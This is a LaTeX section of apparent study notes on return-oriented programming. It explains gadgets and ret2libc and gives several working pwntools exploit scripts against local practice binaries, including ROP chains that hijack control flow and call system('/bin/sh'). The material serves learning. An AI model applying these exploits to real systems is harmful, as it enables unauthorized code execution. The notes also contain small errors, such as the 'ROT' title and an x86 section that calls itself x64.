
\subsection{Return oriented programming (ROT)}

\subsubsection{Introduction}
ROP is a technic used in case a program has  NX bit set (meaning the stack will
not be executable).

The basis of ROP is chaining together small chunks of code already present
within the binary itself in such a way to do what you wish. This often involves
passing parameters to functions already present within \verb+libc+, such as
\verb+system+ 

\subsubsection{Gadgets}
Gadgets are small snippets of code followed by a i\verb+ret+ instruction, e.g.
\verb+pop rdi; ret+. We can manipulate the ret of these gadgets in such a way
as to string together a large chain of them to do what we want.

for example consider we want to call a function and pass it a value in
\verb+rdi+ (first argument provided in \verb+x64+).

Consider we find a gadget \verb+pop rdi ; ret+

the crafting a payload like this will do the job
\verb+<padding_until_rip><gadget_addr><value><fun_addr>+. This mean
\verb+<gadget_addr>+ replace the initial return value of the vulnerable function.

then what will happen is that when the \verb+ret+ of the vuln function execut
it pop the address of \verb+pop rdi+ then it push \verb+value+ in \verb+rdi+
then it exec the \verb+ret+ jumping to the function we want.


to find gadgets: 
\begin{verbatim}
$ ROPgadget --binary ./vuln
Gadgets information
============================================================
0x080490da : adc al, 0x68 ; and al, al ; add al, 8 ; call eax
0x08049052 : adc al, 0xc0 ; add al, 8 ; push 0x10 ; jmp 0x8049020
0x08049042 : adc al, al ; add al, 8 ; push 8 ; jmp 0x8049020
0x08049126 : adc byte ptr [eax + 0x68], dl ; and al, al ; add al, 8 ; call edx
0x080491aa : adc byte ptr [eax - 0x3603a275], dl ; ret
0x08049057 : adc byte ptr [eax], al ; add byte ptr [eax], al ; jmp 0x8049020
...SNIP...
0x08049015 : test eax, eax ; je 0x804901b ; call eax

Unique gadgets found: 124
\end{verbatim}

\subsubsection{Exploiting x86 call convention}

since in \verb+x64+ all parameters are on the stack the exploit is quite simple
the payload is like this
\begin{verbatim}
<padding_until_RIP><fun_addr><rip_for_fun><param_1>...<param_n>
\end{verbatim}
regarding \verb+rip_for_fun+ we don't care where it jumps.
\begin{verbatim}
from pwn import *

p = process('./vuln-32')

payload = b'A' * 52            # Padding up to EIP
payload += p32(0x080491c7)     # Address of flag()
payload += p32(0x0)            # Return address - don't care if crashes when done
payload += p32(0xdeadc0de)     # First parameter
payload += p32(0xc0ded00d)     # Second parameter

log.info(p.clean())
p.sendline(payload)
log.info(p.clean())
\end{verbatim}


\subsubsection{ret2libc}

A \verb+ret2libc+ is based off the \verb+system+ function found within the C
library. This function executes anything passed to it making it the best
target. Another thing found within libc is the string \verb+/bin/sh+; if you
pass this string to system, it will pop a shell.

\begin{itemize}
    \item Getting Libc and its base:
\begin{verbatim}
$ ldd vuln-32
\end{verbatim}

    \item Getting the location of \verb+system()+
\begin{verbatim}
$ readelf -s <libc_path> | grep system
\end{verbatim}

    \item Getting the location of \verb+/bin/sh+: 
\begin{verbatim}
$ strings -a -t x <libc_path> | grep /bin/sh 
\end{verbatim}
\end{itemize}

\begin{verbatim}
from pwn import *

p = process('./vuln-32')

libc_base = 0xf7dc2000
system = libc_base + 0x44f00
binsh = libc_base + 0x18c32b

payload = b'A' * 76         # The padding
payload += p32(system)      # Location of system
payload += p32(0x0)         # return pointer - not important once we get the shell
payload += p32(binsh)       # pointer to command: /bin/sh

p.clean()
p.sendline(payload)
p.interactive()
\end{verbatim}

\begin{verbatim}
from pwn import *

p = process('./vuln-64')

libc_base = 0x7ffff7de5000
system = libc_base + 0x48e20
binsh = libc_base + 0x18a143

POP_RDI = 0x4011cb

payload = b'A' * 72         # The padding
payload += p64(POP_RDI)     # gadget -> pop rdi; ret
payload += p64(binsh)       # pointer to command: /bin/sh
payload += p64(system)      # Location of system
payload += p64(0x0)         # return pointer - not important once we get the shell

p.clean()
p.sendline(payload)
p.interactive()
\end{verbatim}

\subsubsection{Exploiting x64 call convention}
more complex since most parameters are in registers. So we need to find gadget
that will \verb+pop+ into registers. We might have to chain them.
\begin{verbatim}
from pwn import *

p = process('./vuln-64')

POP_RDI, POP_RSI_R15 = 0x4011fb, 0x4011f9


payload = b'A' * 56            # Padding
payload += p64(POP_RDI)        # pop rdi; ret
payload += p64(0xdeadc0de)     # value into rdi -> first param
payload += p64(POP_RSI_R15)    # pop rsi; pop r15; ret
payload += p64(0xc0ded00d)     # value into rsi -> first param
payload += p64(0x0)            # value into r15 -> not important
payload += p64(0x40116f)       # Address of flag()
payload += p64(0x0)

log.info(p.clean())
p.sendline(payload)
log.info(p.clean())
\end{verbatim}

Note that pwntools offer automatic process to grab the needed address:

\begin{verbatim}

elf = context.binary = ELF('./vuln-32')
p = process()

libc = elf.libc                        # Simply grab the libc it's running with
libc.address = 0xf7dc2000              # Set base address

system = libc.sym['system']            # Grab location of system
binsh = next(libc.search(b'/bin/sh'))  # grab string location

\end{verbatim}

